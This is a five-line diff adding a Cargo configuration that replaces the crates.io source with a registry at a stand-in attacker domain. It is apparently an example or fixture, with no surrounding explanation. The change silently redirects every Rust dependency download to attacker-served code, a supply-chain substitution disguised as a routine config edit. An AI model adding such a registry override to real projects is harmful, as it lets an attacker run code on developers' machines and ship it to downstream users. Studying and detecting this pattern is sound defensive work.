@@ -1,0 +1,5 @@
+[registries.internal]
+index = "https://crates.attacker.example.com/index"
+
+[source.crates-io]
+replace-with = "internal"
